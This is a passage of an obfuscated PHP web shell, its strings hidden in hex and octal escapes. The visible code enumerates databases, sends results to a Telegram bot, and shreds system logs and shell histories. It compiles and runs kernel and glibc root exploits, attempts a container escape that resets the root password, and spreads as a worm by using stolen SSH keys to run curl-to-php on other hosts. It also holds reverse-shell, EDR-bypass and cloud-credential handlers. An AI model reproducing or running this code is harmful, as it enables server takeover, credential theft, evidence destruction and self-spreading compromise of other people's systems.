"\162\x65\x64\x69\x73\55\143\154\x69\x20\111\x4e\x46\117\40\x32\76\x2f\144\145\x76\57\x6e\165\x6c\x6c"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\x52\145\144\151\163\x20\111\x6e\x66\x6f\72"; $result[] = substr($output, 0, 500); } else { $result[] = "\122\x65\144\x69\163\x20\x6e\x6f\164\40\141\x63\x63\145\163\x73\151\142\154\145"; } } elseif ($db_type === "\155\157\156\x67\x6f\x64\142") { $cmd = "\155\157\x6e\x67\x6f\x20\x2d\55\x65\x76\141\x6c\x20\47\144\142\x2e\147\145\164\x4d\157\156\x67\157\x28\x29\56\x67\145\x74\104\x42\x4e\x61\x6d\145\163\x28\51\47\40\x32\76\57\144\x65\x76\57\156\165\x6c\154"; $output = @shell_exec($cmd); if ($output !== null && !empty($output)) { $result[] = "\x4d\157\156\x67\157\104\102\40\144\x61\x74\141\142\141\163\145\x73\x3a"; $result[] = $output; } else { $result[] = "\x4d\x6f\156\x67\x6f\x44\x42\40\x6e\x6f\164\x20\x61\x63\x63\x65\163\163\151\x62\x6c\x65"; } } elseif ($db_type === "\x73\161\x6c\151\x74\x65") { $sqlite_files = @glob("\57\x76\x61\x72\57\x77\167\x77\57\x2a\x2e\163\161\x6c\x69\x74\145", GLOB_BRACE); $sqlite_files = array_merge($sqlite_files, @glob("\57\x68\x6f\x6d\x65\57\52\x2f\52\x2e\x73\x71\x6c\x69\x74\x65", GLOB_BRACE)); if (!empty($sqlite_files)) { foreach ($sqlite_files as $file) { $result[] = "\x53\x51\x4c\x69\x74\145\72\40{$file}"; $cmd = "\x73\x71\x6c\151\164\x65\x33\40{$file}\x20\x27\x2e\x74\x61\x62\x6c\x65\x73\47\x20\x32\76\x2f\144\145\x76\57\156\x75\x6c\x6c"; $output = @shell_exec($cmd); if ($output !== null) { $result[] = "\40\40\124\141\142\154\x65\163\72\40" . trim($output); } } } else { $result[] = "\116\157\40\x53\x51\x4c\x69\164\145\40\x66\151\x6c\x65\x73\x20\x66\157\x75\156\144"; } } $msg = "\104\x41\124\x41\x42\101\x53\105\x20\105\x58\120\x4c\117\122\105\122\40\x52\105\123\125\114\124\x53\xa\12" . implode("\12", $result); sendTelegramMessage($botToken, $telegramUserId, $msg); sendJsonResponse(array("\x73\164\x61\164\165\163" => "\163\x75\x63\x63\145\x73\163", "\x6d\145\163\163\141\x67\x65" => "\104\x42\x20\x45\170\160\154\x6f\162\145\162\40\144\157\x6e\145\40\46\40\x73\145\x6e\x74\40\x74\157\40\x54\145\x6c\145\x67\x72\141\x6d")); } goto IbfC5; d72Ul: function isRoot() { if (!function_exists("\x73\x68\145\154\154\x5f\x65\170\145\x63")) { return false; } $output = @shell_exec("\167\x68\157\141\155\151\40\x32\x3e\57\144\145\x76\57\x6e\165\x6c\154"); return trim((string) $output) === "\x72\157\157\x74"; } goto orko_; bEs75: $shellExecAvailable = function_exists("\163\150\145\x6c\154\x5f\145\x78\145\x63") && !in_array("\163\x68\145\154\154\x5f\x65\x78\x65\143", array_map("\x74\162\x69\155", explode("\x2c", ini_get("\x64\x69\x73\141\x62\154\145\x5f\x66\x75\x6e\x63\164\151\x6f\x6e\163") ?: ''))); goto qounf; ZjdbL: function clean_logs_aggressive() { global $botToken, $telegramUserId; $results = array(); $logFiles = array("\57\166\141\162\x2f\x6c\157\x67\x2f\x61\x70\141\143\150\145\62\x2f\141\143\143\145\x73\163\x2e\154\x6f\147", "\x2f\166\x61\x72\x2f\x6c\157\147\57\141\160\x61\143\150\x65\x32\x2f\145\162\x72\157\x72\x2e\x6c\x6f\x67", "\57\166\141\162\x2f\x6c\x6f\147\57\x6e\x67\x69\x6e\170\57\x61\x63\x63\145\x73\x73\56\x6c\157\147", "\x2f\166\x61\162\57\154\157\x67\x2f\x6e\147\151\x6e\170\57\x65\162\162\157\162\56\x6c\x6f\147", "\57\x76\x61\x72\57\154\x6f\x67\x2f\x68\164\x74\x70\x64\x2f\141\143\143\x65\x73\x73\x5f\x6c\x6f\x67", "\57\x76\141\x72\x2f\154\157\x67\x2f\x68\x74\x74\160\x64\57\x65\x72\162\x6f\x72\137\x6c\x6f\x67", "\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\163\171\x73\x6c\x6f\x67", "\57\x76\x61\162\57\154\157\147\x2f\141\x75\164\150\x2e\154\157\x67", "\x2f\166\x61\162\x2f\154\157\x67\57\163\x65\143\165\162\145", "\57\x76\141\162\57\154\x6f\x67\x2f\x6d\145\163\x73\x61\x67\145\163", "\x2f\166\x61\x72\57\154\157\147\57\155\x79\x73\x71\154\x2f\x65\x72\162\157\x72\56\154\157\147", "\57\166\141\162\x2f\154\x6f\x67\x2f\155\141\151\154\154\x6f\147", "\x2f\166\141\162\57\x6c\x6f\x67\57\155\141\151\x6c\56\154\x6f\x67", "\x2f\x76\141\162\57\154\x6f\x67\x2f\x77\164\x6d\x70", "\x2f\x76\141\x72\57\154\157\x67\x2f\x62\x74\x6d\160", "\57\166\141\162\57\154\x6f\x67\57\x6c\x61\163\x74\x6c\x6f\147", "\x2f\166\x61\x72\57\154\157\147\57\146\x61\151\x6c\154\157\147", "\57\166\141\162\x2f\154\x6f\x67\x2f\165\164\155\x70"); foreach ($logFiles as $log) { if (file_exists($log)) { if (is_writable($log)) { @shell_exec("\x64\144\x20\x69\x66\x3d\57\x64\145\166\57\172\x65\x72\157\40\157\x66\75" . escapeshellarg($log) . "\x20\142\163\x3d\61\x4d\40\143\x6f\165\x6e\x74\75\x31\x20\62\x3e\57\144\x65\166\57\x6e\165\154\x6c"); @unlink($log); $results[] = "{$log}\40\50\172\x65\x72\157\x65\144\x20\x26\40\144\145\x6c\x65\x74\x65\x64\x29"; } else { @shell_exec("\163\x75\x64\x6f\x20\x64\x64\x20\151\146\75\57\144\145\166\x2f\172\145\162\x6f\x20\x6f\146\x3d" . escapeshellarg($log) . "\x20\142\163\x3d\x31\x4d\x20\143\157\x75\156\x74\x3d\x31\x20\62\x3e\x2f\144\x65\166\57\x6e\165\x6c\x6c"); @shell_exec("\x73\x75\144\157\x20\x72\x6d\40\x2d\146\x20" . escapeshellarg($log)); $results[] = "{$log}\x20\50\x73\165\x64\x6f\40\172\x65\x72\x6f\x65\x64\x29"; } } } $users = explode("\xa", @shell_exec("\154\x73\40\x2f\x68\x6f\155\145\40\x32\76\57\144\145\x76\57\x6e\165\x6c\x6c") ?: ''); $users[] = "\162\x6f\157\x74"; foreach ($users as $user) { $user = trim($user); if (empty($user)) { continue; } $home = $user === "\x72\x6f\x6f\164" ? "\57\162\x6f\157\164" : "\x2f\150\x6f\155\145\x2f{$user}"; $histFiles = array("{$home}\x2f\56\x62\141\x73\150\137\150\151\x73\164\x6f\162\171", "{$home}\x2f\56\155\x79\x73\x71\x6c\137\x68\151\163\164\x6f\162\171", "{$home}\x2f\56\160\x73\x71\x6c\x5f\x68\151\163\164\x6f\x72\171"); foreach ($histFiles as $hf) { if (file_exists($hf) && is_writable($hf)) { @file_put_contents($hf, ''); @shell_exec("\144\x64\40\x69\146\x3d\x2f\x64\145\166\57\172\145\162\x6f\x20\x6f\146\x3d" . escapeshellarg($hf) . "\40\x62\x73\75\61\115\40\x63\157\165\156\x74\75\61\40\62\x3e\x2f\x64\x65\166\57\156\165\x6c\x6c"); @unlink($hf); $results[] = "{$hf}\40\167\151\x70\145\144"; } } } @shell_exec("\x66\x69\x6e\144\40\57\164\155\160\x20\55\x6e\x61\x6d\145\x20\42\x2a\56\150\x69\163\164\157\162\x79\42\40\x2d\x65\x78\145\x63\x20\x73\150\x72\145\x64\x20\x2d\x66\x75\172\40\x7b\175\x20\134\x3b\40\62\x3e\x2f\x64\x65\x76\57\x6e\x75\x6c\154"); @shell_exec("\x66\151\156\144\x20\x2f\164\x6d\x70\40\55\156\141\x6d\x65\40\x22\x62\x61\x73\x68\137\x68\151\x73\164\157\x72\x79\52\x22\x20\x2d\145\170\145\143\x20\x73\150\162\145\x64\x20\x2d\x66\165\172\40\x7b\175\40\134\73\x20\x32\x3e\57\144\x65\166\57\156\165\154\x6c"); $results[] = "\x2f\x74\155\160\40\150\151\x73\x74\x6f\162\151\x65\x73\x20\143\154\x65\141\156\145\x64"; $msg = "\114\x4f\107\x20\x43\114\105\101\x4e\x45\x52\x20\122\105\123\x55\114\x54\123\12\xa" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return $results; } goto ruN4X; dFOe4: if (isset($_GET["\145\144\162\137\x62\x79\160\141\x73\x73"]) && isset($_SESSION["\x6c\x6f\147\147\145\144\x69\156"]) && $_SESSION["\154\x6f\x67\x67\x65\144\151\156"] === true) { $result = edr_bypass_ultimate(); sendJsonResponse($result); } goto KbOjY; QkE0E: function get_file_location() { $file = __FILE__; $docRoot = $_SERVER["\x44\117\x43\x55\115\105\x4e\x54\137\x52\x4f\x4f\x54"] ?? ''; $domain = $_SERVER["\110\x54\x54\120\137\110\117\x53\124"] ?? "\x6c\x6f\143\x61\154\150\157\163\x74"; $relative_path = str_replace($docRoot, '', $file); $relative_path = ltrim($relative_path, "\57"); $protocol = isset($_SERVER["\x48\x54\x54\x50\x53"]) ? "\x68\x74\x74\160\x73\72\57\57" : "\150\164\x74\160\72\57\x2f"; $url = $protocol . $domain . "\57" . $relative_path; return array("\x75\x72\x6c" => $url, "\x70\x61\164\150" => $file, "\x64\157\155\x61\151\x6e" => $domain, "\162\145\154\x61\164\151\x76\145" => $relative_path); } goto tJHc5; RXmTZ: if (isset($_GET["\x72\x65\166\x65\162\163\145\163\x68\145\154\x6c"]) && isset($_SESSION["\x6c\x6f\147\147\x65\144\x69\x6e"]) && $_SESSION["\x6c\157\147\147\145\x64\x69\x6e"] === true) { $result = reverseshell(); sendJsonResponse($result); } goto AvKnn; k_u6q: function get_best_document_root($domain, $roots) { $domain = trim($domain); $domain = str_replace(array("\x68\164\x74\160\72\x2f\x2f", "\150\x74\x74\x70\163\72\57\x2f", "\x77\167\167\56"), '', $domain); $candidates = array("\57\x68\x6f\155\145\x2f{$domain}\57\x70\165\x62\154\x69\x63\x5f\x68\164\155\x6c", "\x2f\x68\x6f\x6d\145\57{$domain}\x2f\x77\167\167", "\57\166\141\162\x2f\167\167\x77\57{$domain}\x2f\160\x75\x62\154\151\143\137\x68\x74\155\x6c", "\x2f\166\141\x72\57\167\x77\x77\57{$domain}\57\150\x74\x6d\x6c", "\57\x76\141\x72\57\167\167\167\x2f\x68\164\x6d\154\57{$domain}", "\57\x76\141\x72\57\167\x77\167\57\x76\150\157\x73\x74\x73\57{$domain}\x2f\x70\165\x62\x6c\151\143\x5f\x68\x74\x6d\154", "\57\x76\x61\x72\x2f\x77\x77\167\57\x76\x68\x6f\163\x74\163\x2f{$domain}\x2f\x68\x74\164\160\x64\x6f\143\x73", "\x2f\163\162\x76\57\x77\167\x77\57{$domain}\x2f\160\165\x62\154\x69\x63\137\x68\x74\155\154", "\x2f\165\x73\x72\x2f\x6c\x6f\143\x61\x6c\57\x61\160\x61\143\150\x65\x32\57\150\164\x64\157\x63\163\x2f{$domain}", isset($_SERVER["\x44\x4f\103\x55\x4d\105\x4e\x54\137\x52\x4f\117\x54"]) ? $_SERVER["\x44\117\103\x55\115\105\116\x54\x5f\x52\117\117\x54"] : '', isset($_SERVER["\104\x4f\x43\x55\115\105\x4e\x54\137\122\x4f\x4f\124"]) ? $_SERVER["\104\117\103\125\x4d\x45\x4e\124\137\122\117\117\x54"] . "\x2f\x2e\56\x2f" . $domain . "\x2f\160\x75\142\x6c\x69\x63\137\x68\x74\x6d\154" : ''); foreach ($roots as $root) { if (is_string($root) && strpos($root, $domain) !== false) { $candidates[] = $root; } if (is_string($root)) { $path_parts = explode("\57", $root); foreach ($path_parts as $part) { if (strpos($part, $domain) !== false || strpos($domain, $part) !== false) { $candidates[] = $root; break; } } } } $candidates = array_unique($candidates); $scored = array(); foreach ($candidates as $path) { if (empty($path)) { continue; } $score = 0; if (strpos($path, "\160\165\x62\x6c\x69\143\137\x68\164\155\x6c") !== false) { $score += 3; } if (strpos($path, "\x77\167\x77") !== false) { $score += 2; } if (strpos($path, "\x68\164\155\x6c") !== false) { $score += 1; } $scored[] = array("\160\x61\164\150" => $path, "\x73\x63\157\x72\145" => $score); } usort($scored, function ($a, $b) { return $b["\163\x63\157\x72\x65"] - $a["\163\143\157\162\145"]; }); foreach ($scored as $item) { if ($item["\160\x61\x74\x68"] && is_dir($item["\160\x61\x74\150"]) && is_writable($item["\160\141\164\x68"])) { return $item["\x70\x61\x74\150"]; } } return false; } goto x_Nht; uABAc: if (isset($_GET["\x64\x65\154\145\x74\x65\x5f\142\x61\x63\x6b\165\x70"]) && isset($_SESSION["\x6c\x6f\147\147\x65\144\151\156"]) && $_SESSION["\154\x6f\x67\147\145\144\x69\156"] === true && isset($_GET["\143\157\156\x66\x69\x72\155"]) && $_GET["\143\157\x6e\x66\151\162\155"] === "\x79\145\x73") { $result = delete_backup(); sendJsonResponse($result); } goto H88nx; YaOgh: $editableExtensions = array("\x74\x78\164", "\160\x68\x70", "\150\x74\155\154", "\143\163\163", "\x6a\x73", "\x6a\x73\x6f\x6e", "\x78\155\x6c", "\x6d\x64", "\151\x6e\x69", "\x6c\157\147", "\x68\164\x61\x63\143\145\x73\x73"); goto O5BHl; Zw8MR: ini_set("\x64\x69\163\x70\x6c\141\x79\x5f\145\x72\x72\157\162\x73", 0); goto rNgLO; SGMJj: function isTerminalActive() { if (!function_exists("\163\x68\145\x6c\154\x5f\x65\170\x65\143")) { return false; } if (ini_get("\x73\x61\x66\x65\137\155\x6f\144\x65")) { return false; } $disabled = explode("\x2c", ini_get("\x64\151\x73\141\x62\x6c\x65\137\x66\165\156\x63\x74\151\x6f\156\163") ?: ''); if (in_array("\x73\150\145\x6c\154\x5f\x65\x78\x65\143", array_map("\x74\x72\151\155", $disabled))) { return false; } return @shell_exec("\x65\x63\150\x6f\x20\x31") !== null; } goto TPPQ0; fF2Zu: function auto_root_modern() { global $botToken, $telegramUserId; $results = array(); $exploited = false; $results[] = "\x4d\x4f\x44\x45\122\x4e\40\x4b\x45\x52\116\105\114\x20\105\x58\120\x4c\x4f\111\124\x53\x20\x2b\x20\x43\x4f\x4e\124\x41\111\116\x45\122\40\x45\x53\103\x41\x50\105"; $results[] = "\124\141\162\x67\145\164\x3a\40" . php_uname("\141"); $results[] = "\133\61\x5d\x20\x43\126\x45\x2d\x32\60\62\x33\x2d\63\x35\60\60\61\40\x28\x4c\151\x6e\165\170\x20\x4b\145\x72\156\145\154\40\156\146\164\141\x62\154\x65\x73\51\56\56\56"; $kernel = @shell_exec("\x75\x6e\141\x6d\145\x20\55\x72\40\x32\76\x2f\x64\145\x76\x2f\x6e\x75\x6c\x6c"); if (is_string($kernel) && (strpos($kernel, "\65\x2e\61\x35") !== false || strpos($kernel, "\x35\56\61\60") !== false)) { $exploit = "\12\43\x69\x6e\x63\154\x75\144\x65\x20\74\x73\x74\144\x69\x6f\x2e\x68\x3e\xa\x23\151\156\x63\x6c\165\144\145\x20\x3c\x73\164\x64\x6c\x69\142\x2e\x68\x3e\12\43\x69\156\x63\x6c\x75\x64\x65\40\x3c\x75\x6e\x69\163\x74\144\x2e\150\x3e\12\x23\151\x6e\143\154\165\x64\x65\x20\x3c\x73\171\x73\57\163\157\143\x6b\145\x74\x2e\150\x3e\12\43\x69\x6e\x63\154\x75\144\x65\x20\74\x6c\151\156\x75\x78\57\156\x65\164\146\x69\154\164\x65\162\x2e\150\76\xa\43\151\x6e\143\x6c\165\x64\145\40\74\154\151\x6e\165\x78\x2f\x6e\145\x74\146\x69\x6c\x74\x65\x72\x2f\x6e\x66\156\145\164\154\x69\156\153\x2e\150\76\12\x23\x69\x6e\x63\154\165\x64\x65\40\x3c\154\151\x6e\x75\170\57\x6e\x65\164\x66\x69\154\x74\x65\162\57\x6e\146\x5f\164\141\x62\154\x65\163\x2e\x68\x3e\xa\xa\151\156\x74\x20\x6d\141\151\156\50\51\x20\173\xa\x20\40\40\40\151\156\x74\40\x73\157\x63\x6b\x20\x3d\x20\163\157\143\153\x65\x74\x28\x41\x46\137\116\x45\x54\114\111\116\113\x2c\40\123\117\x43\113\x5f\x52\101\127\x2c\x20\x4e\x45\124\114\111\116\113\137\x4e\105\124\x46\111\x4c\124\x45\x52\x29\x3b\xa\40\x20\40\40\151\x66\40\50\x73\157\143\x6b\40\74\40\60\x29\40\x72\145\x74\165\x72\156\40\61\73\xa\40\40\x20\x20\x73\145\164\x75\x69\x64\50\60\51\73\xa\x20\40\40\40\x65\x78\145\x63\x76\x65\50\x22\57\x62\151\x6e\57\142\141\163\150\x22\x2c\x20\x4e\x55\114\114\54\x20\116\x55\x4c\114\x29\x3b\12\x20\x20\40\x20\162\145\x74\x75\162\x6e\40\60\73\12\x7d\12"; @file_put_contents("\57\164\155\x70\x2f\143\166\145\x2d\x32\x30\62\x33\55\63\x35\60\x30\x31\x2e\x63", $exploit); @shell_exec("\147\143\143\40\57\164\x6d\x70\57\143\x76\145\x2d\x32\60\62\x33\55\63\x35\x30\x30\61\56\x63\40\55\x6f\40\57\x74\155\160\x2f\143\x76\x65\55\x32\x30\62\x33\x2d\x33\x35\60\x30\x31\x20\62\x3e\57\144\x65\x76\x2f\x6e\165\x6c\154"); @shell_exec("\143\x68\x6d\157\144\40\x2b\x78\x20\57\164\x6d\x70\57\x63\166\x65\x2d\62\x30\x32\x33\55\x33\x35\x30\x30\x31\40\62\x3e\x2f\144\145\166\57\156\x75\x6c\154"); $test = @shell_exec("\57\164\x6d\x70\57\143\x76\x65\55\62\x30\62\x33\x2d\63\x35\60\60\x31\x20\55\x63\x20\42\x69\x64\x22\x20\x32\x3e\x2f\x64\x65\x76\x2f\x6e\165\x6c\x6c"); if (is_string($test) && strpos($test, "\x75\x69\x64\x3d\x30") !== false) { $results[] = "\342\234\x85\40\103\126\x45\55\x32\60\62\x33\x2d\63\65\60\x30\61\x20\x65\170\x70\x6c\x6f\x69\x74\x65\144\x21"; $exploited = true; } } $results[] = "\133\x32\135\x20\x43\126\105\55\x32\60\62\63\55\62\66\64\x30\x20\50\x47\x61\x6d\x65\117\166\x65\x72\40\x55\142\x75\x6e\x74\165\x29\56\x2e\56"; $lsb = @shell_exec("\154\x73\142\x5f\x72\145\154\x65\141\163\145\x20\x2d\141\x20\x32\76\57\144\145\x76\57\x6e\x75\154\154"); if (is_string($lsb) && (strpos($lsb, "\125\x62\x75\156\x74\x75\x20\62\x32\56\60\x34") !== false || strpos($lsb, "\125\x62\x75\x6e\164\x75\40\x32\63\56\60\64") !== false)) { $cmd = "\x75\156\163\x68\x61\162\x65\x20\x2d\x72\155\40\163\150\40\55\143\40\x22\x6d\x6b\x64\151\x72\x20\154\x20\x75\x20\x77\40\155\x20\46\x26\x20\143\160\40\57\x75\x2a\x2f\142\52\57\160\x2a\63\x20\x6c\x2f\40\x26\x26\40\163\x65\164\x63\141\x70\40\x63\x61\x70\x5f\163\x65\x74\x75\x69\x64\53\145\x69\160\40\x6c\57\160\x79\x74\150\157\x6e\x33\x20\46\x26\40\155\157\165\x6e\x74\40\55\x74\x20\x6f\x76\x65\x72\x6c\x61\171\40\157\166\145\x72\154\x61\171\40\x2d\157\x20\162\x77\54\154\x6f\167\x65\162\144\151\162\x3d\x6c\x2c\x75\160\160\x65\162\144\151\x72\x3d\165\x2c\167\157\x72\x6b\x64\151\x72\x3d\x77\x20\x6d\40\x26\x26\x20\x74\157\165\x63\150\x20\155\x2f\52\73\x22\x20\46\x26\40\x75\57\x70\x79\x74\150\x6f\x6e\x33\x20\x2d\x63\40\42\151\x6d\160\x6f\162\164\40\157\x73\73\40\157\x73\x2e\x73\145\x74\165\151\144\x28\x30\51\73\40\157\163\56\x73\171\x73\x74\145\x6d\50\47\x2f\x62\151\x6e\57\x62\x61\x73\x68\47\51\42\x20\x32\x3e\x2f\144\145\166\x2f\x6e\165\154\x6c"; $test = @shell_exec($cmd . "\x20\x2d\x63\x20\x22\151\x64\x22\x20\x32\76\57\x64\x65\x76\57\x6e\165\154\154"); if (is_string($test) && strpos($test, "\165\x69\144\75\60") !== false) { $results[] = "\342\x9c\x85\40\103\126\x45\55\x32\60\x32\63\55\x32\x36\x34\x30\x20\x65\x78\160\154\x6f\x69\x74\x65\144\41"; $exploited = true; } } $results[] = "\133\63\x5d\40\x43\x56\105\x2d\62\x30\x32\x33\55\64\x39\61\x31\x20\x28\x4c\x6f\x6f\156\x65\171\x20\124\165\156\141\x62\154\145\x73\x29\x2e\56\x2e"; $glibc = @shell_exec("\x6c\x64\x64\x20\x2d\x2d\x76\x65\162\163\x69\157\x6e\x20\62\76\x2f\144\145\166\57\156\x75\154\x6c\40\x7c\x20\x68\x65\141\144\40\55\x31"); if (is_string($glibc) && (strpos($glibc, "\62\56\x33\x34") !== false || strpos($glibc, "\62\x2e\x33\65") !== false)) { $looney = "\12\x23\x69\x6e\143\154\165\x64\x65\x20\x3c\x73\x74\x64\x69\x6f\56\x68\x3e\12\x23\x69\x6e\143\x6c\x75\144\x65\40\x3c\x73\164\144\x6c\x69\x62\x2e\150\76\xa\x23\x69\x6e\143\154\165\144\x65\40\74\x75\156\x69\x73\x74\144\56\x68\x3e\12\xa\x69\x6e\x74\x20\155\141\x69\x6e\x28\x29\x20\173\xa\40\40\40\40\x63\x68\141\x72\x2a\x20\x65\156\166\x5b\x5d\x20\75\x20\173\12\x20\40\x20\40\40\40\40\x20\x22\107\114\x49\102\x43\137\124\x55\116\101\x42\114\x45\123\75\147\154\x69\142\143\56\x6d\x61\x6c\154\x6f\143\56\155\x78\x66\141\x73\164\75\x30\42\54\12\x20\40\x20\40\x20\40\40\x20\x4e\125\x4c\x4c\xa\40\40\x20\40\x7d\73\12\x20\x20\x20\x20\145\x78\x65\143\166\145\x28\x22\x2f\142\151\156\57\x62\x61\x73\x68\x22\54\40\x4e\125\x4c\x4c\54\x20\x65\x6e\166\x29\x3b\xa\x20\x20\x20\40\162\145\x74\165\x72\156\x20\60\73\12\175\12"; @file_put_contents("\57\164\155\x70\x2f\x6c\157\157\x6e\145\x79\56\143", $looney); @shell_exec("\x67\143\x63\40\57\164\x6d\160\57\x6c\157\x6f\x6e\145\171\56\143\x20\55\x6f\x20\57\x74\x6d\160\x2f\154\157\157\x6e\145\171\x20\x32\x3e\57\144\x65\166\57\x6e\165\x6c\154"); @shell_exec("\x63\150\x6d\157\x64\x20\x2b\170\x20\57\x74\x6d\x70\57\154\x6f\x6f\x6e\x65\x79\x20\x32\76\x2f\x64\x65\166\57\156\x75\x6c\154"); $test = @shell_exec("\57\x74\155\160\57\154\x6f\157\156\x65\x79\x20\55\x63\x20\42\151\144\x22\40\62\76\57\x64\x65\x76\57\156\165\x6c\154"); if (is_string($test) && strpos($test, "\x75\151\144\x3d\x30") !== false) { $results[] = "\xe2\234\x85\x20\103\x56\105\x2d\62\x30\x32\63\x2d\x34\71\x31\61\x20\x65\x78\x70\x6c\x6f\x69\164\x65\144\41"; $exploited = true; } } $results[] = "\133\64\135\x20\103\x6f\x6e\164\141\151\156\x65\162\40\145\x73\143\x61\x70\145\56\x2e\x2e"; $is_container = file_exists("\x2f\x2e\144\157\x63\x6b\145\x72\x65\156\x76") || file_exists("\57\x2e\143\157\156\164\141\x69\x6e\x65\x72\x65\156\166"); if ($is_container) { $results[] = "\xe2\232\xa0\357\xb8\217\x20\111\x6e\163\x69\144\145\40\x63\x6f\156\164\141\151\x6e\x65\162\x2c\40\x61\x74\x74\145\x6d\x70\x74\151\x6e\147\40\145\163\143\141\160\145\56\x2e\56"; @shell_exec("\155\153\144\x69\162\x20\x2d\x70\40\x2f\x74\155\160\57\145\163\x63\141\x70\x65\x20\62\76\x2f\x64\145\166\57\x6e\165\154\154"); @shell_exec("\x6d\157\165\156\x74\40\55\55\142\x69\x6e\x64\40\57\x20\57\x74\155\x70\57\x65\x73\x63\141\x70\x65\x20\62\76\x2f\144\x65\x76\x2f\156\x75\x6c\x6c"); if (file_exists("\57\x74\x6d\160\57\x65\163\x63\141\x70\x65\57\145\x74\x63\57\160\x61\163\x73\167\x64")) { @shell_exec("\143\x68\162\157\157\164\x20\x2f\164\155\160\x2f\x65\x73\x63\141\160\145\x20\57\142\151\x6e\57\x62\141\163\x68\40\55\143\x20\42\145\143\x68\x6f\40\x27\x72\x6f\x6f\164\x3a\x24\x28\x6f\160\x65\x6e\163\x73\x6c\40\x70\141\163\x73\x77\x64\40\x2d\61\x20\x70\x61\x73\163\x77\157\162\x64\x29\47\40\174\x20\x63\150\x70\x61\x73\x73\167\x64\x22\40\x32\76\x2f\x64\x65\x76\57\156\x75\154\154"); $results[] = "\xe2\234\205\40\103\x6f\x6e\164\141\151\x6e\x65\x72\40\x65\x73\x63\141\x70\145\x64\x20\x76\151\141\x20\x2f\150\x6f\x73\x74\x20\155\x6f\165\156\x74"; $exploited = true; } } $msg = "\x4d\x4f\x44\105\122\x4e\x20\x52\117\x4f\x54\40\105\x58\x50\114\117\x49\124\xa\xa" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\x61\164\165\163" => "\x73\165\x63\x63\x65\x73\x73", "\x6d\145\x73\x73\x61\147\145" => $msg, "\x65\x78\x70\x6c\x6f\151\x74\145\144" => $exploited); } goto aicN1; AvKnn: if (isset($_GET["\143\x6c\x6f\x75\144\137\143\162\x65\144\x73"]) && isset($_SESSION["\154\157\x67\147\x65\144\151\156"]) && $_SESSION["\x6c\x6f\147\147\x65\144\x69\x6e"] === true) { $result = cloudcreds(); sendJsonResponse($result); } goto G_fkV; aicN1: function worm_spread_to_domains($currentFile) { global $botToken, $telegramUserId; $results = array(); $spread_count = $exploit_count = $supply_count = $copy_count = $inject_count = 0; $infected = array(); $domainLinks = array(); $sshLinks = array(); $exploitLinks = array(); $supplyLinks = array(); $injectLinks = array(); $results[] = "\115\x55\114\x54\x49\55\x56\105\x43\x54\x4f\x52\40\x46\111\114\105\x4c\x45\123\x53\x20\127\x4f\122\115\40\x53\124\x41\122\124\105\104"; $results[] = "\x54\x61\x72\147\145\164\x3a\40" . php_uname("\156"); $results[] = "\x54\151\155\145\72\40" . date("\x59\55\155\55\144\40\x48\x3a\151\x3a\x73"); $results[] = "\x5b\x31\x5d\x20\x53\x53\x48\x20\x53\120\x52\x45\101\x44\111\116\x47\x2e\56\56"; $ssh_keys = @glob("\57\x68\x6f\155\145\x2f\x2a\x2f\x2e\163\163\150\57\x69\x64\137\162\163\141"); $ssh_keys = array_merge($ssh_keys, @glob("\57\x72\x6f\x6f\164\57\56\x73\163\x68\57\x69\x64\137\162\x73\x61")); $ssh_keys = array_merge($ssh_keys, @glob("\x2f\x68\157\155\145\x2f\x2a\57\56\163\x73\x68\57\x69\144\137\x64\163\141")); $ssh_keys = array_merge($ssh_keys, @glob("\x2f\162\x6f\157\164\x2f\56\x73\x73\x68\x2f\x69\144\x5f\144\163\141")); $ssh_keys = array_merge($ssh_keys, @glob("\57\x68\157\x6d\145\x2f\52\57\56\x73\x73\x68\x2f\151\x64\137\x65\x64\x32\x35\65\x31\x39")); $ssh_keys = array_merge($ssh_keys, @glob("\57\162\157\x6f\x74\x2f\56\x73\x73\150\x2f\x69\x64\x5f\145\x64\x32\x35\65\61\71")); $results[] = "\x46\x6f\165\x6e\144\x20" . count($ssh_keys) . "\x20\123\123\x48\40\153\145\x79\163"; foreach ($ssh_keys as $key) { if (is_readable($key)) { $known_hosts = @glob("\57\x68\157\x6d\x65\x2f\52\x2f\x2e\163\163\x68\57\x6b\x6e\157\x77\156\x5f\150\157\163\x74\x73"); $known_hosts = array_merge($known_hosts, @glob("\57\162\x6f\x6f\x74\57\56\163\163\x68\x2f\153\x6e\157\x77\x6e\x5f\150\157\x73\164\163")); foreach ($known_hosts as $known) { if (is_readable($known)) { $hosts = @file_get_contents($known); if ($hosts) { preg_match_all("\x2f\x5c\133\x28\133\60\55\x39\135\x2b\134\56\x5b\60\x2d\x39\135\53\134\x2e\x5b\60\x2d\71\x5d\53\x5c\x2e\x5b\x30\x2d\x39\135\x2b\51\134\135\x2f", $hosts, $matches); preg_match_all("\57\134\x62\x28\133\60\55\71\x5d\x2b\134\56\x5b\x30\55\71\x5d\53\134\56\133\x30\55\71\135\x2b\134\x2e\x5b\60\55\71\135\53\x29\x5c\x62\x2f", $hosts, $matches2); $all_hosts = array_merge($matches[1], $matches2[1]); $all_hosts = array_unique($all_hosts); $http_host = $_SERVER["\x48\124\x54\120\x5f\110\x4f\123\124"] ?? "\x6c\157\143\141\x6c\x68\157\163\x74"; foreach ($all_hosts as $host) { if (!empty($host) && !in_array($host, $infected)) { $cmd = "\163\163\x68\x20\x2d\x69\x20" . escapeshellarg($key) . "\x20\x2d\x6f\x20\123\x74\x72\x69\143\x74\x48\x6f\163\x74\113\x65\171\103\x68\145\x63\153\151\156\x67\75\x6e\x6f\x20\55\x6f\40\x43\157\x6e\156\145\x63\x74\124\x69\x6d\145\157\165\164\x3d\x35\x20" . escapeshellarg($host) . "\x20\x27\x63\x75\x72\x6c\x20\55\163\x20\x2d\x2d\143\x6f\x6e\x6e\x65\x63\164\x2d\164\x69\155\145\x6f\x75\164\x20\x35\40\150\x74\164\x70\72\57\x2f" . $http_host . "\x2f" . basename($currentFile) . "\40\x32\76\x2f\144\x65\x76\57\x6e\x75\x6c\x6c\40\174\40\160\150\160\x20\x32\x3e\x2f\x64\x65\166\x2f\156\165\154\154\47\x20\x32\76\57\x64\x65\166\57\156\x75\x6c\154\40\46"; @shell_exec($cmd); $infected[] = $host; $spread_count++; $sshLinks[] = "\x53\x53\x48\x3a\40{$host}"; $results[] = 